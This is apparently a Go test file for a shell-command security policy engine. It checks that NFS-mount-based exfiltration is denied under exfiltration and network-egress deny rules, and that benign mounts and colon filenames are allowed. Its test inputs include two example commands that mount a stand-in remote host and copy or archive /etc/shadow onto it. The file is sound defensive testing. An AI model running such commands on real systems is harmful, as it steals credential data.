package policy_test

// ===========================================================================
// Pass 63 decisions: Finding 99
// ===========================================================================

import (
	"testing"

	"github.com/v0lka/flowsh/api"
	"github.com/v0lka/flowsh/engine"
	"github.com/v0lka/flowsh/policy"
)

// TestFinding099NFSMountIsDenied pins the decision level of F99: an NFS mount
// source `host:/export` was a bare FSMeta target, so neither an
// `Exfiltration: Deny` rule nor a network rule fired on the credential copied
// under the mount point.
func TestFinding099NFSMountIsDenied(t *testing.T) {
	exfilDeny := policy.Config{Exfiltration: policy.Deny}
	netDeny := policy.Config{Effects: map[engine.EffectKind]policy.Action{
		engine.KindNetEgress: policy.Deny,
	}}
	for _, src := range []string{
		`mount -t nfs a.example:/export /mnt; cp /etc/shadow /mnt/x`,
		`mount -t nfs a.example:/export /mnt && tar czf /mnt/x.tgz /etc/shadow`,
	} {
		mustDecide(t, exfilDeny, analyzeOK(t, api.LangBash, src), policy.Deny, src+" (exfil deny)")
		mustDecide(t, netDeny, analyzeOK(t, api.LangBash, src), policy.Deny, src+" (net deny)")
	}

	// Precision: a local mount and a filename containing a colon are allowed.
	for _, src := range []string{
		`mount -t ext4 /dev/sda1 /mnt`,
		`cp a b:/x`,
		`echo hi > foo.txt:bar`,
	} {
		mustDecide(t, exfilDeny, analyzeOK(t, api.LangBash, src), policy.Allow, src+" (control)")
		mustDecide(t, netDeny, analyzeOK(t, api.LangBash, src), policy.Allow, src+" (net control)")
	}
}
